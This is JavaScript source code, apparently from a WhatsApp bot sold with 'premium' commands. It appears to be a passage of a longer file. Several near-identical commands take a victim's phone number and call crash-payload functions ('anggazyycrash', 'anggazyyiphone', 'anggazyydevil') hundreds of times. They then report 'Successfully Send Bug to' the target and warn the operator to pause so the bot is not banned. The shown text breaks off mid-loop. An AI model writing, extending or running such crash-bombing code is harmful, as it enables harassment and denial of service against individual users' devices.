case '🤯': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case '🤡': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case '〽️': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case '🎁': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break

case '⚔️': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case '🗡': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case '🔧': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case '⚙️': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
